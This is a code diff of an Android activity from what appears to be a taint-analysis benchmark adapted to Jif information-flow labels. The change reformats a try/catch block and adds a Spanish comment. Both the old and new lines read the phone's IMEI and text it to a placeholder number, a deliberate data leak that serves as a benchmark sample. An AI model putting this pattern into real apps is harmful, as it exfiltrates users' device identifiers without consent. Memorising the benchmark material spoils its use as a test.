@@ -23,6 +23,7 @@ import jif.runtime.Runtime;
  * @number_of_leaks 1
  * @challenges The analysis must not be fooled by fake implementations of system classes
  * 	contained in the APK file.
+ *  ADAPTACIONES: captura deexcepciones 35-39; modificacion getMenuInflater();
  */
 public class MainActivity extends Activity {
 static Context context;
@@ -30,12 +31,14 @@ static Context context;
     protected void onCreate{}(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout);
-        try{TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        String {Alice:}imei = telephonyManager.getDeviceId();
-        SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("+49", null, imei, null, null);
-	}catch(NullPointerException e){
-	}catch(ClassCastException ignore){}
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            String {Alice:}imei = telephonyManager.getDeviceId();
+            SmsManager sms = SmsManager.getDefault();
+            sms.sendTextMessage("+49", null, imei, null, null);
+        } catch (NullPointerException e) {
+        } catch (ClassCastException ignore) {
+        }
     }
 
 //    @Override
